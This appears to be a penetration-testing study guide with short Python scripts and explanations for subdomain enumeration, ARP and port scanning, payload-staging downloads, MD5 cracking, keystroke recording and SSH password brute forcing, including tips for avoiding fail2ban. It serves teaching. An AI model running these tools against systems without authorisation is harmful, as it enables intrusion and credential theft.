Topic 1 — Subdomain Enumeration via HTTP
What It Is
Subdomain enumeration is the process of discovering all subdomains associated with a target domain during the reconnaissance phase of a pentest. Each subdomain is a separate attack surface with its own services, technology stack, and potential vulnerabilities.
How the Script Works
The script takes a wordlist of potential subdomain names, prepends each one to the target domain, and attempts an HTTP connection. If the connection succeeds, the subdomain is assumed to exist.
pythonimport requests
import sys

sub_list = open("subdomains.txt").read()
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}"
    try:
        requests.get(sub_domains, timeout=3)
    except requests.ConnectionError:
        pass
    except requests.Timeout:
        pass
    else:
        print("Valid domain: ", sub_domains)
```

### Key Concepts

**`sys.argv`** — a list automatically populated by Python with command line arguments at runtime. `sys.argv[0]` is always the script name. Your actual arguments start at `sys.argv[1]`.

**`open().read().splitlines()`** — reads the wordlist file into a single string, then splits it into a list of strings on newline characters, one entry per line.

**`requests.get()`** — sends an HTTP GET request to the target URL. If the server responds with anything — even an error page — the connection succeeded and the subdomain exists.

**`requests.ConnectionError`** — raised when no network connection can be established to the target. This is how the script determines a subdomain does not exist.

**`requests.Timeout`** — raised when the server does not respond within the timeout period. Must be caught separately from `ConnectionError`.

### Key Limitations
- Uses HTTP — requires a full TCP handshake per attempt, slow and noisy
- Only detects subdomains running an HTTP service — misses subdomains with no web server
- Sequential — one attempt at a time

### Better Alternative
DNS enumeration — queries DNS directly for A records instead of making HTTP connections. Faster, operates at a lower level, detects subdomains regardless of what services are running on them.

### Common Errors Encountered
- **`AttributeError: circular import`** — caused by naming the script `enum.py`, which shadows Python's standard library `enum` module. Fix: rename the script to something descriptive like `subdomain_enum.py`
- **No output** — caused by wrong wordlist path, using `example.com` as target, or timeouts not being caught

---

## Topic 2 — ARP Host Discovery

### What It Is
ARP (Address Resolution Protocol) scanning identifies live hosts on a local network subnet by sending broadcast ARP requests and recording which hosts reply.

### Why ARP Over ICMP
ICMP (Internet Control Message Protocol) operates at Layer 3 and can be filtered by firewalls and host-level rules. ARP operates at Layer 2 — below IP — and is fundamental to network communication. Hosts cannot ignore ARP requests without breaking their own network connectivity, making ARP more reliable for local network host discovery.

### How ARP Works
```
Scanner broadcasts: "Who has 10.10.1.5? Tell 10.10.1.1"
        ↓ sent to ff:ff:ff:ff:ff:ff — every device receives this
Live host replies:  "10.10.1.5 is at aa:bb:cc:dd:ee:ff"
        ↓ unicast reply directly to scanner
Scanner records: aa:bb:cc:dd:ee:ff - 10.10.1.5
The Script
pythonfrom scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst=ip_range)
ans, unans = srp(packet, timeout=2, iface=interface, inter=0.1)

for send, receive in ans:
    print(receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

### Key Concepts

**Scapy** — Python packet manipulation library that allows crafting, sending, receiving, and dissecting raw network packets at any layer.

**`Ether(dst=broadcastMac)/ARP(pdst=ip_range)`** — the `/` operator in Scapy stacks protocol layers. This constructs a Layer 2 Ethernet frame containing a Layer 3 ARP payload. The broadcast MAC `ff:ff:ff:ff:ff:ff` ensures every device on the subnet receives the frame.

**`srp()`** — Send and Receive Packets at Layer 2. Returns two lists — `ans` (answered) and `unans` (unanswered). Each entry in `ans` is a tuple of `(sent_packet, received_packet)`.

**`receive.sprintf(r"%Ether.src% - %ARP.psrc%")`** — Scapy's string formatting method that extracts specific fields from a packet. `Ether.src` is the source MAC, `ARP.psrc` is the source IP of the replying host.

**CIDR (Classless Inter-Domain Routing) notation** — `/24` means 24 bits are the network portion, leaving 8 bits for hosts — 254 usable addresses. Scapy automatically expands this into individual IPs.

### What To Change Before Running
- `interface` — verify with `ip link show`, may be `ens33`, `enp0s3` etc. instead of `eth0`
- `ip_range` — replace `X.X` with your actual subnet from `ip addr show`
- Run with `sudo` — raw Layer 2 packet crafting requires root privileges

### Key Limitation
ARP is **local subnet only**. Routers do not forward Layer 2 broadcasts. Cannot be used for remote network discovery.

---

## Topic 3 — TCP Port Scanner

### What It Is
A port scanner probes TCP ports on a target host to determine which are open (a service is listening), closed (no service), or filtered (firewall dropping packets).

### How It Works — TCP Full Connect Scan
```
Scanner  →  SYN          →  Target:Port
Scanner  ←  SYN-ACK      ←  Target:Port  (OPEN)
Scanner  →  ACK + RST    →  Target:Port  (connection closed immediately)

OR

Scanner  →  SYN          →  Target:Port
Scanner  ←  RST-ACK      ←  Target:Port  (CLOSED)
The Script
pythonimport sys
import socket

ip = sys.argv[1]
open_ports = []
ports = range(1, 65536)

def probe_port(ip, port, result=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        r = sock.connect_ex((ip, port))
        if r == 0:
            result = r
        sock.close()
    except Exception as e:
        pass
    return result

for port in ports:
    sys.stdout.flush()
    response = probe_port(ip, port)
    if response == 0:
        open_ports.append(port)

if open_ports:
    print("Open Ports are: ")
    print(sorted(open_ports))
else:
    print("Looks like no ports are open :(")
Key Concepts
socket.socket(socket.AF_INET, socket.SOCK_STREAM) — creates a TCP socket. AF_INET specifies IPv4. SOCK_STREAM specifies TCP. For UDP you would use SOCK_DGRAM.
sock.settimeout(0.5) — sets maximum wait time per connection attempt. Critical for filtered ports that never respond — without this the script hangs indefinitely.
sock.connect_ex((ip, port)) — attempts TCP three-way handshake. Returns 0 on success (port open), non-zero error code on failure (port closed or filtered). Unlike connect(), it does not raise an exception on failure.
result=1 default parameter — function defaults to returning 1 (not open). Only returns 0 if connection succeeds. Clean binary signal.
sys.stdout.flush() — forces Python to immediately write buffered output to terminal. Without this, output is batched and you see nothing until the script finishes.
socket.gethostbyname(host) — resolves a hostname to an IPv4 address via DNS. Allows the script to accept domain names instead of only raw IPs.
Why It Is Slow and The Fix
Sequential scanning with 0.5 second timeout per port across 65535 ports = up to 9 hours. Fix is multithreading with concurrent.futures.ThreadPoolExecutor:
pythonfrom concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=100) as executor:
    results = executor.map(probe_port, ports)
100 simultaneous threads reduces worst case to approximately 5 minutes.

Topic 4 — File Downloader
What It Is
HTTP file retrieval using Python — equivalent to wget on Linux or certutil on Windows. Used in post-exploitation for payload staging — downloading tools onto a compromised system.
The Script
pythonimport requests

url = 'https://example.com/file.zip'
r = requests.get(url, allow_redirects=True)
open('file.zip', 'wb').write(r.content)
```

### Key Concepts

**`requests.get(url, allow_redirects=True)`** — sends HTTP GET request. `allow_redirects=True` automatically follows HTTP 301/302 redirects until the final resource is reached.

**`r.content`** — raw response body as bytes. Used for binary files — images, ZIPs, executables.

**`r.text`** — response body decoded as UTF-8 string. Used for text files — HTML, JSON, plaintext.

**`open('file.zip', 'wb')`** — opens file in write binary mode. The `b` flag is critical for non-text files — without it Python attempts UTF-8 decoding which corrupts binary data.

### Pentest Relevance
- Staging tools onto compromised systems
- Hosting tools on your attack machine with `python3 -m http.server 8080` and downloading them on the target
- Automating payload delivery as part of a larger post-exploitation script

---

## Topic 5 — Hash Cracker

### What Is Hashing
A one-way mathematical function producing a fixed-length digest from arbitrary input. Cannot be mathematically reversed — cleartext can only be recovered via dictionary attack or brute force.

### How a Dictionary Attack Works
```
Wordlist entry → Hash function → Generated hash
                                       ↓
                              Compare with target hash
                                       ↓
                         Match → cleartext found
                         No match → next wordlist entry
The Script
pythonimport hashlib

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
Key Concepts
hashlib.md5() — creates an MD5 hash object. MD5 (Message Digest 5) produces a 128-bit / 32 hexadecimal character digest. Cryptographically broken but still common in legacy systems and CTFs.
line.strip() — removes the \n newline character from each wordlist entry. Without this you hash "password\n" instead of "password" — completely different hash, never matches.
.encode() — converts string to bytes using UTF-8 encoding. hashlib requires bytes input, not strings.
hash_ob.hexdigest() — returns the hash as a lowercase hexadecimal string — the standard human-readable hash format.
exit(0) — terminates immediately with success code once password is found. No point continuing through the rest of the wordlist.
Common Hash Algorithms
AlgorithmDigest LengthStatusMD532 hex charsBroken, still commonSHA-140 hex charsDeprecatedSHA-25664 hex charsCurrent standardNTLM32 hex charsWindows credentialsbcryptVariablePassword storage standard

Topic 6 — Keylogger
What It Is
Records keystrokes system-wide at the OS input device level — below the application layer. A post-exploitation credential harvesting technique.
How It Works
On Linux — reads from /dev/input/ kernel event interface, requires root. On Windows — registers a low-level keyboard hook via SetWindowsHookEx() Win32 API call with WH_KEYBOARD_LL flag, intercepts all keystrokes system-wide.
The Script
pythonimport keyboard

keys = keyboard.record(until='ENTER')
keyboard.play(keys)
Key Concepts
keyboard.record(until='ENTER') — blocks execution, records all keyboard events system-wide until the termination key is pressed. Returns a list of KeyboardEvent objects each containing name, event_type (down/up), and time.
keyboard.play(keys) — replays recorded events by simulating keystrokes. The OS receives these as if generated by a real keyboard.
Backspace is recorded literally — the module records physical key presses, not resulting text. Editing mistakes are captured as backspace events, not erasures.
Pentest Relevance
Post-exploitation credential harvesting — captures passwords typed into sudo prompts, SSH sessions, web forms. Requires root on Linux. Detected by EDR (Endpoint Detection and Response) solutions monitoring for low-level input hooks.

Topic 7 — SSH Brute Force
What It Is
Systematically trying passwords from a wordlist against SSH authentication on a target system. A credential attack used when a valid username is known but the password is not.
How SSH Authentication Works
Every attempt requires a full TCP handshake plus SSH protocol handshake before the credential is even submitted — making SSH brute forcing inherently slow compared to offline hash cracking.
The Script
pythonimport paramiko
import sys

target = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        response = ssh_connect(password)
        if response == 0:
            print('password found: ' + password)
            exit(0)
        elif response == 1:
            print('no luck')
Key Concepts
paramiko.SSHClient() — creates an SSH client object that manages the full SSHv2 protocol lifecycle — TCP connection, key exchange, encryption negotiation, and authentication.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) — automatically accepts any server host key without prompting. Necessary for automation — without this the script pauses on every connection waiting for manual confirmation.
ssh.connect(target, port=22, username=username, password=password) — attempts full SSH authentication. Raises paramiko.AuthenticationException on failure, returns cleanly on success.
code=0 default parameter — same binary signal pattern as the port scanner. 0 = success, 1 = failure.
banner_timeout — controls how long Paramiko waits for the SSH banner after TCP connection. Default is too short for busy servers — set to 10 to avoid Error reading SSH protocol banner.
Threading Fix
Reducing max_workers to 3 prevents the target SSH server from dropping connections due to too many simultaneous attempts. Too many threads also triggers fail2ban which blocks your IP entirely.
Connecting After Finding the Password
bashssh username@target_ip

Cross-Cutting Concepts Across All Topics
Exception Handling Pattern
Every script uses the same try/except/else pattern:
pythontry:
    # attempt the operation
except SpecificException:
    pass  # handle known failure
except Exception as e:
    print(e)  # catch unexpected errors
else:
    # runs only if no exception was raised
File I/O Pattern
pythonwith open(file_path, 'r') as file:
    for line in file.readlines():
        entry = line.strip()  # always strip newlines
Binary Signal Pattern
Functions return 0 for success and 1 for failure — a consistent pattern across the port scanner and SSH brute forcer that makes response handling clean and readable.
Threading Pattern
pythonfrom concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=N) as executor:
    list(executor.map(function, iterable))
list() forces consumption of the lazy iterator — without it threads may not execute.
Naming Conflicts
Never name scripts the same as Python standard library modules — enum.py, socket.py, os.py, re.py etc. Always use descriptive names tied to what the script does.
